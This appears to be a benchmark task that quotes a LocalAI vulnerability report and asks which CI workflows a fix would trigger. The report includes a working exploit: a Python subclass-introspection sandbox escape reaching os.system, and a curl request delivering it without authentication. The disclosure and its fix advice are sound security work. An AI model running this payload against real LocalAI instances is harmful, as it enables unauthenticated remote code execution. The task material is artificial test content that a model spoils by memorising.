# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 5: RCE via inline GRPO reward function sandbox escape

**LocalAI version:**
commit `05b8d8aa` (2026-07-14, master)

**Environment, CPU architecture, OS, and Version:**
Linux x86_64. Docker container built from the repo Dockerfile with `-race` instrumentation. Default `local-ai run` flags, no `--auth-enabled`. Not architecture specific.

**Describe the bug**

`POST /api/fine-tuning/jobs` accepts `reward_functions[].code`, an inline Python string, with no sanitization (`core/http/endpoints/localai/finetune.go:22`). `FineTuneService.StartJob()` forwards it verbatim to the `trl` backend over gRPC (`core/services/finetune/service.go:173-240`).

`backend/python/trl/backend.py:494-496` execs the code against `_SAFE_BUILTINS`, a hand rolled allowlist replacing `__builtins__` (`backend/python/trl/reward_functions.py:133-175`). Execution happens synchronously during a smoke test, before any training runs. The allowlist is a broken sandbox: `().__class__.__bases__[0].__subclasses__()` reaches `os._wrap_close`, whose `__init__.__globals__` is the real `os` module, exposing unrestricted `os.system`.

`fine_tuning` requires no authentication by default. `auth.RequireFeature` becomes a no-op whenever `AuthDB()` is nil, the default unless `LOCALAI_AUTH` is set. Startup logs confirm `stats: using in-memory ring buffer (no-auth single-user mode)`.

**To Reproduce**

This uses a minimal stand-in gRPC `trl` backend because the real Python `backend/python/trl` environment is heavy to install. The vulnerable logic exercised, `reward_functions.py`, is used byte for byte unmodified from the repo. Only the gRPC/training scaffolding around it (model loading, GRPOTrainer loop) is stubbed.

```bash
mkdir -p /tmp/localai-rce-poc && cd /tmp/localai-rce-poc

# 1. Copy the real, unmodified vulnerable file from the repo checkout
cp /path/to/LocalAI/backend/python/trl/reward_functions.py .

# 2. Minimal driver that calls the real function, exactly as backend.py:496 does
cat > run_reward.py <<'EOF'
import sys, json
from reward_functions import build_reward_functions
build_reward_functions(json.loads(sys.stdin.read()))
print("compiled reward function(s) via build_reward_functions()")
EOF

# 3. The malicious payload, identical in shape to reward_functions[] in the HTTP request
cat > payload.json <<'EOF'
[{
  "type": "inline",
  "name": "evil",
  "code": "for cls in ().__class__.__bases__[0].__subclasses__():\n    if cls.__name__ == '_wrap_close':\n        cls.__init__.__globals__['system']('touch /tmp/pwned_grpo_rce')\n        break\nreturn [1.0 for _ in completions]"
}]
EOF

# 4. Prove the sandbox escape locally, calling only the real unmodified code
rm -f /tmp/pwned_grpo_rce
python3 run_reward.py < payload.json
ls -la /tmp/pwned_grpo_rce   # file exists: sandboxed code ran os.system()
```

To reproduce the full end-to-end path through the live HTTP API, run an unmodified `local-ai` container with a local `trl` backend registered under `--backends-path` (any script implementing the `StartFineTune` gRPC call that forwards `extra_options["reward_funcs"]` to the above `run_reward.py`), then:

```bash
docker run -d --name victim -p 8080:8080 \
  -v $(pwd)/models:/models \
  -v $(pwd)/backends:/backends \
  localai-image run --address 0.0.0.0:8080 --models-path /models --backends-path /backends --debug

curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST http://127.0.0.1:8080/api/fine-tuning/jobs \
  -H "Content-Type: application/json" \
  --data '{
    "model": "victim-model",
    "dataset_source": "dummy-dataset",
    "training_method": "grpo",
    "reward_functions": [{
      "type": "inline",
      "name": "evil",
      "code": "for cls in ().__class__.__bases__[0].__subclasses__():\n    if cls.__name__ == '"'"'_wrap_close'"'"':\n        cls.__init__.__globals__['"'"'system'"'"']('"'"'touch /tmp/pwned_grpo_rce'"'"')\n        break\nreturn [1.0 for _ in completions]"
    }]
  }'

docker exec victim test -f /tmp/pwned_grpo_rce && echo "RCE CONFIRMED inside victim container"
```

No `Authorization` header or API key is sent. The request still returns HTTP 201 and the sentinel file appears inside the victim container.

**Expected behavior**

`reward_functions[].code` should never be able to execute arbitrary OS commands. Untrusted Python should run in a real sandbox (subprocess with no filesystem/network access, seccomp, gVisor, or similar), not a Python level `__builtins__` allowlist. The fine-tuning API should also require authentication by default.

**Logs**

```
HTTP status: 201
-- response body --
{"id":"6d5c9977-e9d5-4e5c-9d2d-9c14ea4ea88a","status":"queued","message":"trl-sim: started, compiled 1 reward function(s) via build_reward_functions()\n"}

== checking whether the sandbox-escape payload executed INSIDE THE VICTIM local-ai CONTAINER ==
CONFIRMED: /tmp/pwned_grpo_rce exists inside the victim local-ai container -- arbitrary command execution via the inline reward function 'code' field, through the real, unmodified reward_functions.py sandbox.
-rw-r--r-- 1 root root 0 Jul 17 03:13 /tmp/pwned_grpo_rce

Jul 17 03:13:01 INFO  stats: using in-memory ring buffer (no-auth single-user mode)
Jul 17 03:13:01 DEBUG Registering backend name="trl" runFile="/backends/trl/run.sh"
Jul 17 03:13:03 DEBUG GRPC stderr line="[trl-sim] StartFineTune called job_id=6d5c9977-e9d5-4e5c-9d2d-9c14ea4ea88a model=\"victim-model\" training_method=\"grpo\" extra_options_keys=[reward_funcs]"
Jul 17 03:13:03 DEBUG GRPC stderr line="[trl-sim] extra_options[reward_funcs] (attacker-controlled JSON, from HTTP req.reward_functions) = [{\"type\":\"inline\",\"name\":\"evil\",\"code\":\"for cls in ().__class__.__bases__[0].__subclasses__():\\n    if cls.__name__ == '_wrap_close':\\n        cls.__init__.__globals__['system']('touch /tmp/pwned_grpo_rce')\\n        break\\nreturn [1.0 for _ in completions]\"}]"
Jul 17 03:13:03 DEBUG GRPC stderr line="[trl-sim] run_reward.py stdout: compiled 1 reward function(s) via build_reward_functions()"
Jul 17 03:13:03 INFO  HTTP request method="POST" path="/api/fine-tuning/jobs" status=201
```

**Additional context**

The prior audit verdict on this PoC is `VERIFIED_BEHAVIOR`. An unauthenticated `POST /api/fine-tuning/jobs` against an unmodified `local-ai` (`-race`) container returned HTTP 201, and the inline `reward_functions[0].code` sandbox escape payload executed as an OS command inside the victim container, through the real unmodified `reward_functions.py` `compile_inline_reward()` / `build_reward_functions()` logic.

### Impact

An unauthenticated remote attacker who can reach the LocalAI HTTP API gains arbitrary OS command execution as the user running the `local-ai` process, by submitting a crafted `code` string in `reward_functions` to `POST /api/fine-tuning/jobs`. The Python `__builtins__` allowlist in `reward_functions.py` is not a real sandbox and is bypassed with a standard subclass introspection gadget. Since the fine-tuning API requires no authentication in the default configuration, this is full unauthenticated RCE against any default-configured LocalAI instance that has the `trl` backend installed.

### Fix

Do not exec untrusted `code` in the same process using a `__builtins__` allowlist. Run inline reward function code in a real isolated sandbox (a locked-down subprocess or container with no filesystem/network access, seccomp/gVisor, and a strict timeout) or disable the inline `code` reward function type entirely and only allow referencing pre-registered, developer-authored reward functions by name. Also make `fine_tuning` require authentication by default rather than silently no-op when `AuthDB()` is nil.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `95afddd9362ed2ee12ec686bab23707dde556541`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__11015__95afddd",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
